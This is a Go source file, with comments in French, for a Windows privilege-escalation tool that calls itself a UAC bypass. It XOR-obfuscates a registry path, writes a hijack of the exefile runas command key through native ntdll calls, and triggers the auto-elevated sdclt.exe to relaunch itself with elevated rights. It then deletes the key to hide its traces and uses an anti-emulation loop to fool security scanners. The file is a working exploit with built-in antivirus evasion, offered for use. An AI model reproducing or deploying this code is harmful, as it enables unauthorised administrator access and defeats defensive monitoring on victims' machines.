//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// --- OBFUSCATION XOR ---
func xor(data []byte) string {
	for i := range data {
		data[i] ^= 0x42
	}
	return string(data)
}

var (
	// "Software\\Classes\\exefile\\shell\\runas\\command" XORed (0x42)
	k1 = []byte{0x11, 0x2d, 0x24, 0x36, 0x35, 0x23, 0x30, 0x27, 0x1c, 0x01, 0x2e, 0x2e, 0x23, 0x31, 0x31, 0x27, 0x31, 0x1c, 0x27, 0x3a, 0x27, 0x24, 0x2b, 0x2e, 0x27, 0x1c, 0x31, 0x2a, 0x27, 0x2e, 0x2e, 0x1c, 0x30, 0x37, 0x2c, 0x23, 0x31, 0x1c, 0x21, 0x2d, 0x2f, 0x2f, 0x23, 0x2c, 0x26}
)

// --- APIS NTDLL NATIVES ---
var (
	ntdll           = syscall.NewLazyDLL("ntdll.dll")
	procNtCreateKey = ntdll.NewProc("NtCreateKey")
	procNtSetValue  = ntdll.NewProc("NtSetValueKey")
	procNtClose     = ntdll.NewProc("NtClose")
	// Résout le chemin \Registry\User\S-1-5-... dynamiquement
	procRtlFormat = ntdll.NewProc("RtlFormatCurrentUserKeyPath")
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            syscall.Handle
	ObjectName               *UNICODE_STRING
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

func CheckAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// ExploitGhost : Version v10.1 - Résolution dynamique du chemin utilisateur via NT API
func ExploitGhost() bool {
	// 0. Anti-Emulation (Calcul inutile pour tromper les scanners comportementaux)
	for i := 0; i < 1000000; i++ {
		_ = i * i
	}

	fmt.Println("[*] Phase 1 : Résolution dynamique du SID utilisateur (NT Native)...")

	var userKeyPath UNICODE_STRING
	retFormat, _, _ := procRtlFormat.Call(uintptr(unsafe.Pointer(&userKeyPath)))
	if retFormat != 0 {
		fmt.Printf("[-] Erreur RtlFormat : 0x%x\n", retFormat)
		return false
	}

	// Conversion du buffer UTF16 en string Go
	rawPath := syscall.UTF16ToString((*[1024]uint16)(unsafe.Pointer(userKeyPath.Buffer))[:userKeyPath.Length/2])
	fullRegistryPath := rawPath + "\\" + xor(k1)

	fmt.Println("[*] Phase 2 : Injection silencieuse via NtCreateKey...")

	var hKey syscall.Handle
	uPath, _ := syscall.UTF16FromString(fullRegistryPath)
	uStr := UNICODE_STRING{
		Length:        uint16((len(uPath) - 1) * 2),
		MaximumLength: uint16(len(uPath) * 2),
		Buffer:        &uPath[0],
	}

	objAttr := OBJECT_ATTRIBUTES{
		Length:     uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		ObjectName: &uStr,
		Attributes: 0x40, // OBJ_CASE_INSENSITIVE
	}

	// Création de la clé de registre au niveau Kernal
	ret, _, _ := procNtCreateKey.Call(
		uintptr(unsafe.Pointer(&hKey)),
		0xF003F, // KEY_ALL_ACCESS
		uintptr(unsafe.Pointer(&objAttr)),
		0, 0, 0, 0,
	)

	if ret != 0 {
		fmt.Printf("[-] Erreur NT API (CreateKey) : 0x%x\n", ret)
		return false
	}
	defer procNtClose.Call(uintptr(hKey))

	// Écriture de la valeur IsolatedCommand (Payload : relance ce binaire)
	selfPath, _ := os.Executable()
	valName, _ := syscall.UTF16FromString("IsolatedCommand")
	vNameStr := UNICODE_STRING{
		Length:        uint16((len(valName) - 1) * 2),
		MaximumLength: uint16(len(valName) * 2),
		Buffer:        &valName[0],
	}
	data, _ := syscall.UTF16FromString(selfPath)

	procNtSetValue.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(&vNameStr)),
		0,
		uintptr(1), // REG_SZ
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)*2),
	)

	fmt.Println("[*] Phase 3 : Déclenchement via SDCLT (Auto-Elevated)...")

	// Lancement de sdclt.exe qui possède les privilèges maximum hérités.
	// Le flag /kickoffelev force la lecture de notre hijack "runas\command"
	_ = exec.Command("sdclt.exe", "/kickoffelev").Run()

	fmt.Println("[*] Phase 4 : Nettoyage des traces...")
	time.Sleep(2 * time.Second)

	// Nettoyage régulier via Shell (le trigger a déjà eu lieu)
	exec.Command("reg", "delete", "HKCU\\"+xor(k1), "/f").Run()

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 PRIVESC [GHOST EDITION v10.1]")
	fmt.Println("   Target: Build 22631.6199 (AV Bypass Optimized)")
	fmt.Println("   Technique: RtlFormat + NtCreateKey Hijack")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("\n[+] ############################################")
		fmt.Println("[+] #     SUCCÈS : ÉLÉVATION DÉTECTÉE !        #")
		fmt.Println("[+] ############################################")
		fmt.Println("\n[*] Privilèges : SYSTEM / Administrator")

		fmt.Println("\nAppuyez sur Entrée pour quitter...")
		var input string
		fmt.Scanln(&input)
		return
	}

	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Tentative d'escalade furtive (GHOST v10.1)...")

	if ExploitGhost() {
		fmt.Println("\n[+] L'exploit a été injecté avec succès.")
		fmt.Println("[*] Vérifiez si une session élevée s'est ouverte.")
	} else {
		fmt.Println("[-] ÉCHEC : L'exploit a rencontré un obstacle.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
